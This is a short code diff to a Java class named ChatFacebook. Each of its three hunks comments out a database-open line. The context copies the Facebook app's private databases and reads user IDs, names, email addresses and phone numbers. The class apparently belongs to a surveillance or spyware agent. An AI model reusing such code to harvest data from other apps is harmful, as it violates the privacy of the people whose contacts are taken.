@@ -118,7 +118,7 @@ public class ChatFacebook extends SubModuleChat {
 			}
 			return false;
 		}
-		SQLiteDatabase db = helper.getReadableDatabase();
+		//SQLiteDatabase db = helper.getReadableDatabase();
 
 		String[] projection = new String[] { "key", "value" };
 		String selection = null;
@@ -348,7 +348,7 @@ public class ChatFacebook extends SubModuleChat {
 		}
 		String dbFile = "users_db2";
 		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
-		SQLiteDatabase db = helper.getReadableDatabase();
+		//SQLiteDatabase db = helper.getReadableDatabase();
 
 		String[] projection = new String[] { "fbid", "first_name", "last_name", "name", "email_addresses",
 				"phone_numbers" };
@@ -365,7 +365,7 @@ public class ChatFacebook extends SubModuleChat {
 		}
 		String dbFile = "contacts_db2";
 		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
-		SQLiteDatabase db = helper.getReadableDatabase();
+		//SQLiteDatabase db = helper.getReadableDatabase();
 
 		RecordListVisitor visitor = new RecordListVisitor("data");
 		helper.traverseRecords("contacts", visitor);
